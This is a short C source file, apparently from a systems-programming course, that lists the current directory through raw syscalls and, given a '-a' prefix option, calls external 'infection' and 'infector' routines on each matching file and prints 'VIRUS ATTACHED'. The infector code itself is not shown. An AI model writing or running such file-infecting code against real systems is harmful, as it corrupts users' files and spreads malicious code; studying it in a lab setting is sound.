#include "util.h"

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define O_RDONLY 0
#define STDOUT 1
#define BUF_SIZE 8192

extern int system_call();
extern void infection();
extern void infector(char *filename);

int main(int argc, char *argv[]) {
    int fd, nread;
    char buf[BUF_SIZE];
    int bpos;
    char prefix = '\0';
    int filter_active = 0;
    int i;

    for (i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'a') {
            filter_active = 1;
            prefix = argv[i][2];
        }
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    bpos = 0;
    while (bpos < nread) {
        short d_reclen = *(short*)(buf + bpos + 8);
        char *d_name = (char*)(buf + bpos + 10);
        int is_target = 0;

        if (filter_active && d_name[0] == prefix) {
            is_target = 1;
        }

        if (is_target) {
            infection();
            infector(d_name);
        }

        system_call(SYS_WRITE, STDOUT, d_name, strlen(d_name));

        if (is_target) {
            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
        }

        system_call(SYS_WRITE, STDOUT, "\n", 1);

        bpos += d_reclen;
    }

    system_call(SYS_CLOSE, fd, 0, 0);

    return 0;
}